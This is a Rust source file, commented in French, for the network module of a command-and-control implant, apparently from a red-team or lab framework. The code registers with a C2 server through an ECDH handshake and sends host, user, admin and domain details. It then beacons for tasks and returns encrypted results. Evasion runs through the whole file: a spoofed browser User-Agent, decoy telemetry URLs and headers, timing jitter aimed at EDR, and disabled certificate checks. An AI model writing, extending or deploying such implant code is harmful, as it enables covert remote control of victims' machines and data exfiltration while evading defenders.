// transport.rs — Communication chiffrée agent → serveur
//
// Ce module gère tout ce qui touche au réseau :
//   - Enregistrement initial (handshake ECDH)
//   - Beacon loop : check-in toutes les N secondes
//   - Envoi des résultats de tâches
//
// Le trafic HTTP est conçu pour ressembler à du trafic légitime :
//   - User-Agent d'un navigateur réel
//   - URIs banales (/api/v1/telemetry, /api/v1/metrics)
//   - Corps HTTP JSON standard
//   - Jitter sur les intervalles pour éviter les détections par timing


use rand::Rng;
use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;

use crate::crypto;

// ─────────────────────────────────────────────────────────────
// Types partagés agent ↔ serveur
// ─────────────────────────────────────────────────────────────

/// Payload d'enregistrement envoyé au serveur
#[derive(Serialize)]
pub struct RegisterRequest {
    pub pk: String,  // Clé publique ECDH en base64
    pub h:  String,  // Hostname
    pub o:  String,  // OS
    pub a:  String,  // Architecture
    pub u:  String,  // Username
    pub p:  u32,     // PID
    pub ia: bool,    // Is admin
    pub i:  String,  // Integrity level
    pub d:  String,  // Domain
}

/// Réponse du serveur à l'enregistrement
#[derive(Deserialize)]
pub struct RegisterResponse {
    pub id: String,  // UUID assigné par le serveur
    pub pk: String,  // Clé publique ECDH du serveur
    pub s:  u64,     // Sleep interval (secondes)
    pub j:  u64,     // Jitter (%)
}

/// Beacon envoyé à chaque check-in (contenu chiffré)
#[derive(Serialize)]
pub struct BeaconData {
    pub id: String,
    pub h:  String,
    pub u:  String,
    pub p:  u32,
    pub a:  bool,
    pub i:  String,
    pub ip: String,
}

/// Réponse du serveur au beacon (contenu chiffré)
#[derive(Deserialize)]
pub struct BeaconResponse {
    pub tasks: Vec<Task>,
    pub sleep: u64,
    pub jitter: u64,
    pub kill: bool,
}

/// Tâche envoyée par le serveur
#[derive(Deserialize, Clone)]
pub struct Task {
    pub id:      String,
    pub agent_id: String,
    #[serde(rename = "type")]
    pub task_type: String,
    pub payload: Option<String>,
}

/// Résultat d'une tâche (envoyé au serveur)
#[derive(Serialize)]
pub struct TaskResult {
    pub task_id:  String,
    pub agent_id: String,
    pub output:   String,
    pub error:    String,
    pub success:  bool,
}

// ─────────────────────────────────────────────────────────────
// Session — état de la connexion avec le serveur
// ─────────────────────────────────────────────────────────────

pub struct Session {
    pub agent_id:    String,
    pub session_key: Vec<u8>,
    pub c2_url:      String,
    pub sleep:       u64,
    pub jitter:      u64,
    client:          Client,
}

impl Session {
    /// Crée le client HTTP avec les paramètres d'évasion
    fn build_client() -> Client {
        Client::builder()
            // User-Agent d'un navigateur Chrome réel
            .user_agent(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
                 AppleWebKit/537.36 (KHTML, like Gecko) \
                 Chrome/120.0.0.0 Safari/537.36"
            )
            // Timeout raisonnable
            .timeout(Duration::from_secs(30))
            // Accepter les certs self-signed en lab
            // EN PRODUCTION : mettre danger_accept_invalid_certs(false)
            // et utiliser un vrai certificat
            .danger_accept_invalid_certs(true)
            .build()
            .expect("Failed to build HTTP client")
    }

    /// register — effectue le handshake initial avec le serveur
    ///
    /// Processus :
    ///   1. Générer paire ECDH
    ///   2. Envoyer clé publique + infos système
    ///   3. Recevoir UUID + clé publique serveur
    ///   4. Dériver la clé de session partagée
    pub fn register(
        c2_url: &str,
        sysinfo: &RegisterRequest,
    ) -> Result<Session, String> {
        let client = Self::build_client();

        // Générer la paire ECDH de l'agent
        let keypair = crypto::AgentKeyPair::generate();

        let mut req = serde_json::to_value(sysinfo)
            .map_err(|e| e.to_string())?;

        // Injecter la clé publique
        req["pk"] = serde_json::Value::String(keypair.public_key_b64());

        // POST /api/v1/telemetry
        let url = format!("{}/api/v1/telemetry", c2_url);
        let response = client
            .post(&url)
            .header("Content-Type", "application/json")
            .header("Accept", "application/json")
            // Header leurre — fait ressembler à du trafic analytics
            .header("X-Analytics-Version", "2.1.0")
            .json(&req)
            .send()
            .map_err(|e| format!("register request failed: {}", e))?;

        if !response.status().is_success() {
            return Err(format!("register failed: HTTP {}", response.status()));
        }

        let reg_resp: RegisterResponse = response
            .json()
            .map_err(|e| format!("register parse failed: {}", e))?;

        // Dériver la clé de session à partir de la clé publique du serveur
        let session_key = keypair.derive_session_key(&reg_resp.pk)?;

        Ok(Session {
            agent_id: reg_resp.id,
            session_key,
            c2_url: c2_url.to_string(),
            sleep: reg_resp.s,
            jitter: reg_resp.j,
            client,
        })
    }

    /// beacon — check-in toutes les N secondes
    /// Retourne la liste des tâches à exécuter
    pub fn beacon(&self, beacon_data: &BeaconData) -> Result<BeaconResponse, String> {
        // Chiffrer le beacon avec la clé de session
        let encrypted = crypto::encrypt_json_b64(&self.session_key, beacon_data)?;

        let body = serde_json::json!({
            "id": self.agent_id,
            "d":  encrypted,
        });

        let url = format!("{}/api/v1/metrics", self.c2_url);
        let response = self.client
            .post(&url)
            .header("Content-Type", "application/json")
            .header("X-Analytics-Version", "2.1.0")
            .json(&body)
            .send()
            .map_err(|e| format!("beacon request failed: {}", e))?;

        if response.status().as_u16() == 401 {
            return Err("UNAUTHORIZED: re-register required".into());
        }

        if !response.status().is_success() {
            return Err(format!("beacon failed: HTTP {}", response.status()));
        }

        // Déchiffrer la réponse
        let resp_json: serde_json::Value = response
            .json()
            .map_err(|e| format!("beacon response parse: {}", e))?;

        let encrypted_resp = resp_json["d"]
            .as_str()
            .ok_or("missing 'd' field in response")?;

        let beacon_resp: BeaconResponse =
            crypto::decrypt_json_b64(&self.session_key, encrypted_resp)?;

        Ok(beacon_resp)
    }

    /// send_result — envoie le résultat d'une tâche au serveur
    pub fn send_result(&self, result: &TaskResult) -> Result<(), String> {
        let encrypted = crypto::encrypt_json_b64(&self.session_key, result)?;

        let body = serde_json::json!({
            "id": self.agent_id,
            "d":  encrypted,
        });

        let url = format!("{}/api/v1/analytics", self.c2_url);
        let response = self.client
            .post(&url)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .map_err(|e| format!("result request failed: {}", e))?;

        if !response.status().is_success() {
            return Err(format!("result failed: HTTP {}", response.status()));
        }

        Ok(())
    }

    /// sleep_with_jitter — attend N secondes avec variation aléatoire
    ///
    /// Exemple : sleep=60, jitter=20 → attente entre 48 et 72 secondes
    /// Les patterns de timing réguliers sont une signature EDR forte.
    pub fn sleep_with_jitter(&self) {
        let mut rng = rand::thread_rng();
        let base = self.sleep as f64;
        let jitter_pct = self.jitter as f64 / 100.0;
        let variation = base * jitter_pct;

        // Intervalle aléatoire dans [base - variation, base + variation]
        let actual_sleep = base + rng.gen_range(-variation..=variation);
        let actual_sleep = actual_sleep.max(5.0) as u64; // Minimum 5 secondes

        std::thread::sleep(Duration::from_secs(actual_sleep));
    }
}
